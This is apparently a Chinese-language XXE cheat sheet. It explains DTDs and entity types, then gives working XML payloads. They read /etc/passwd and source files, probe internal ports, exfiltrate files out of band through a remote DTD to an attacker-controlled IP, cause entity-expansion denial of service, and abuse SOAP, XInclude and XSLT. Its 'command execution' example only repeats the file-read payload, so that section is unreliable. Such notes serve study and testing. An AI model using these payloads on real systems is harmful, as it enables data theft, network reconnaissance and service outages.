## 基础
XXE(XML External Entity Injection)全称为XML外部实体注入，由于程序在解析输入的XML数据时，解析了攻击者伪造的外部实体而产生的。
PHP 中 XXE标志函数 `simplexml_load_string()`
### DTD
文档类型定义（DTD）可定义合法的XML文档构建模块。它使用一系列合法的元素来定义文档的结构。
DTD 可被成行地声明于 XML 文档中，也可作为一个外部引用。
#### 内部的DOCTYPE声明
DTD 被包含在您的 XML 源文件中
```xml
<!DOCTYPE 根元素 [元素声明]>
```

#### 外部文档声明
假如 DTD 位于 XML 源文件的外部
```xml
<!DOCTYPE 根元素 SYSTEM "文件名">
```

**DTD的作用：**
- 通过 DTD，您的每一个 XML 文件均可携带一个有关其自身格式的描述。
- 通过 DTD，独立的团体可一致地使用某个标准的 DTD 来交换数据。
- 您的应用程序也可使用某个标准的 DTD 来验证从外部接收到的数据
- 您还可以使用 DTD 来验证您自身的数据
#### 实体
- 内置实体 (Built-in entities)
- 字符实体 (Character entities)
- 通用实体 (General entities)
- 参数实体 (Parameter entities)
实体根据引用方式，还可分为内部实体与外部实体，看看这些实体的申明方式
参数实体用`%实体名称`申明，引用时也用`%实体名称`;其余实体直接用`实体名称`申明，引用时用`&实体名称`。  
参数实体只能在DTD中申明，DTD中引用；其余实体只能在DTD中申明，可在xml文档中引用。
内部实体
```xml
<!ENTITY 实体名称 "实体的值">
```
外部实体
```xml
<!ENTITY 实体名称 SYSTEM "URI">
```
参数实体
```xml
<!ENTITY % 实体名称 "实体的值">或者<!ENTITY % 实体名称 SYSTEM "URI">
```

>注意：`%name`（参数实体）是在DTD中被引用的，而`&name`（其余实体）是在xml文档中被引用的。
由于xxe漏洞主要是利用了DTD引用外部实体导致的漏洞，那么重点看下能引用哪些类型的外部实体。

![](attachments/Pasted%20image%2020240319191658.jpg)

![](attachments/Pasted%20image%2020240319191724.jpg)

## XXE利用
### 读取任意文件
file 协议，file:///etc//passwd  
php 协议，php://filter/read=convert.base64-encode/resource=index.php
```xml
<!DOCTYPE root[
        <!ENTITY  xxe SYSTEM "php://filter/read=convert.base64-encode/resource=/etc/passwd">
]>
<root><name>&xxe;</name></root>

```

```xml
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE xxe [
    <!ELEMENT name ANY >
    <!ENTITY xxe SYSTEM "file:///etc/passwd" >
]>
<root>
    <name>&xxe;</name>
</root>

```

### 执行系统命令
在特殊的配置环境下，PHP环境中PHP的expect模块被加载到了易受攻击的系统或者能处理XML的应用中，就能执行命令
```xml
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE xxe [
    <!ELEMENT name ANY >
    <!ENTITY xxe SYSTEM "file:///etc/passwd" >
]>
<root>
    <name>&xxe;</name>
</root>
```

### 探测内网端口
```xml
<?xml version="1.0" encoding="utf-8"?> 
<!DOCTYPE xxe [
<!ELEMENT name ANY>
<!ENTITY xxe SYSTEM "http://192.168.199.100:80">]>
<root>
<name>&xxe;</name>
</root>
```
内网信息
```
file:///etc/hosts

file:///proc/net/arp

file:///proc/net/tcp

file:///proc/net/udp

file:///proc/net/dev

file:///proc/net/fib_trie
```

### Blind XXE
#### php://filter + 外部实体
```XML
<?xml version="1.0"?>
<!DOCTYPE ANY[
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/var/www/html/xxe/test.php">
<!ENTITY % remote SYSTEM "http://ip/xxe.dtd">
%remote;
%all;
%send;
]>
```

```XML
<!ENTITY % all "<!ENTITY &#37; send SYSTEM 'http://IP/?a=%file;'>">
```

 payload 中能看到 连续调用了三个参数实体 %remote;%int;%send;，这就是我们的利用顺序，%remote 先调用，调用后请求远程服务器上的 test.dtd ，有点类似于将 xxe.dtd 包含进来，然后 %int 调用 test.dtd 中的 %file, %file 就会去获取服务器上面的敏感文件，然后将 %file 的结果填入到 %send 以后(因为实体的值中不能有 %, 所以将其转成html实体编码 `%`)，我们再调用 %send; 把我们的读取到的数据发送到我们的远程 vps 上，这样就实现了外带数据的效果


### CDATA
特殊子元塞入CDATA解决读取问题
```XML
<!DOCTYPE data [
 <!ENTITY % dtd SYSTEM "http://kaibro.tw/cdata.dtd">
     %dtd;
     %all;
 ]>
<root>&f;</root>
```

```XML
<!ENTITY % file SYSTEM "file:///var/www/html/flag.xml">
<!ENTITY % start "<![CDATA[">
<!ENTITY % end "]]>">
<!ENTITY % all "<!ENTITY f '%start;%file;%end;'>">
```

### DOS
```XML
<!DOCTYPE data [
<!ENTITY a0 "dos" >
<!ENTITY a1 "&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;">
<!ENTITY a2 "&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;">
<!ENTITY a3 "&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;">
<!ENTITY a4 "&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;">
]>
<data>&a4;</data>
```

### Error-based XXE
```XML
<?xml version="1.0"?>
<!DOCTYPE message [ 
	<!ELEMENT message ANY> 
	<!ENTITY % para1 SYSTEM "file:///flag"> 
	<!ENTITY % para ' 
		<!ENTITY &#x25; para2 "
			<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///&#x25;para1;&#x27;>
		"> &#x25;para2; 
	'> 
%para;]>
<message>10</message>
```

### SOAP
```XML
<soap:Body>
<foo>
<![CDATA[<!DOCTYPE doc [<!ENTITY % dtd SYSTEM "http://kaibro.tw:22/"> %dtd;]><xxx/>]]>
</foo>
</soap:Body>
```

### XInclude
```XML
<?xml version="1.0" encoding="UTF-8"?>
<root xmlns:xi="http://www.w3.org/2001/XInclude">
<xi:include href="http://kaibro.tw/file.xml"></xi:include>
</root>
```

### XSLT
```XML
<xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:abc="http://php.net/xsl" version="1.0">
<xsl:template match="/">
<xsl:value-of select="unparsed-text('/etc/passwd', 'utf-8')"/>
</xsl:template>
</xsl:stylesheet>
```